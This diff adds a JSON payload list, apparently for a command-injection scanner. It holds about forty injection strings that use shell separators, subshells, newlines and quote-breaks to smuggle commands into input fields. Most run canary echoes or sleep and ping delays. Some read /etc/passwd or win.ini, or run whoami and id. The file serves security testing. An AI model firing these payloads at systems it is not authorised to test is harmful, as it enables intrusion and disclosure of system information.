@@ -1,0 +1,169 @@
+{
+    "canary": "rce_test_8888",
+    "payloads": [
+        {
+            "payload": "; echo $((9999-1111))",
+            "type": "Linux math echo semicolon"
+        },
+        {
+            "payload": "| echo $((9999-1111))",
+            "type": "Linux math echo pipe"
+        },
+        {
+            "payload": "|| echo $((9999-1111))",
+            "type": "Linux math echo OR"
+        },
+        {
+            "payload": "`echo $((9999-1111))`",
+            "type": "Linux math backtick"
+        },
+        {
+            "payload": "$(echo $((9999-1111)))",
+            "type": "Linux math subshell"
+        },
+        {
+            "payload": "; echo rce_test_8888",
+            "type": "Linux pure echo semicolon"
+        },
+        {
+            "payload": "| echo rce_test_8888",
+            "type": "Linux pure echo pipe"
+        },
+        {
+            "payload": "& echo rce_test_8888",
+            "type": "Windows pure echo ampersand"
+        },
+        {
+            "payload": "| echo rce_test_8888",
+            "type": "Windows pure echo pipe"
+        },
+        {
+            "payload": "; sleep 3",
+            "type": "Linux sleep semicolon"
+        },
+        {
+            "payload": "| sleep 3",
+            "type": "Linux sleep pipe"
+        },
+        {
+            "payload": "|| sleep 3",
+            "type": "Linux sleep double-OR"
+        },
+        {
+            "payload": "|| sleep 3 ||",
+            "type": "Linux sleep double-OR wrapped"
+        },
+        {
+            "payload": "`sleep 3`",
+            "type": "Linux sleep backtick"
+        },
+        {
+            "payload": "$(sleep 3)",
+            "type": "Linux sleep subshell"
+        },
+        {
+            "payload": "; sleep 10",
+            "type": "Linux sleep 10s semicolon"
+        },
+        {
+            "payload": "| sleep 10",
+            "type": "Linux sleep 10s pipe"
+        },
+        {
+            "payload": "|| sleep 10 ||",
+            "type": "Linux sleep 10s double-OR wrapped"
+        },
+        {
+            "payload": "; ping -c 3 127.0.0.1",
+            "type": "Linux ping delay"
+        },
+        {
+            "payload": "| ping -c 3 127.0.0.1",
+            "type": "Linux ping pipe delay"
+        },
+        {
+            "payload": "|| ping -c 3 127.0.0.1 ||",
+            "type": "Linux ping double-OR wrapped"
+        },
+        {
+            "payload": "|| ping -c 10 127.0.0.1 ||",
+            "type": "Linux ping 10s double-OR wrapped"
+        },
+        {
+            "payload": "| ping -n 3 127.0.0.1",
+            "type": "Windows ping delay"
+        },
+        {
+            "payload": "|| ping -n 3 127.0.0.1 ||",
+            "type": "Windows ping double-OR wrapped"
+        },
+        {
+            "payload": "& ping -n 3 127.0.0.1 &",
+            "type": "Windows ping ampersand wrapped"
+        },
+        {
+            "payload": "; cat /etc/passwd",
+            "type": "Linux read passwd semicolon"
+        },
+        {
+            "payload": "| cat /etc/passwd",
+            "type": "Linux read passwd pipe"
+        },
+        {
+            "payload": "; type C:\\Windows\\win.ini",
+            "type": "Windows read win.ini semicolon"
+        },
+        {
+            "payload": "| type C:\\Windows\\win.ini",
+            "type": "Windows read win.ini pipe"
+        },
+        {
+            "payload": "|| whoami ||",
+            "type": "Linux whoami double-OR wrapped"
+        },
+        {
+            "payload": "; whoami",
+            "type": "Linux whoami semicolon"
+        },
+        {
+            "payload": "| whoami",
+            "type": "Linux whoami pipe"
+        },
+        {
+            "payload": "& whoami",
+            "type": "Windows whoami ampersand"
+        },
+        {
+            "payload": "; id",
+            "type": "Linux id semicolon"
+        },
+        {
+            "payload": "| id",
+            "type": "Linux id pipe"
+        },
+        {
+            "payload": "&& id",
+            "type": "Linux id double-AND"
+        },
+        {
+            "payload": "%0a sleep 3",
+            "type": "Linux newline sleep"
+        },
+        {
+            "payload": "%0a ping -c 3 127.0.0.1",
+            "type": "Linux newline ping"
+        },
+        {
+            "payload": "\n sleep 3",
+            "type": "Linux literal newline sleep"
+        },
+        {
+            "payload": "'; sleep 3; '",
+            "type": "Linux quote-break sleep"
+        },
+        {
+            "payload": "\"; sleep 3; \"",
+            "type": "Linux dquote-break sleep"
+        }
+    ]
+}
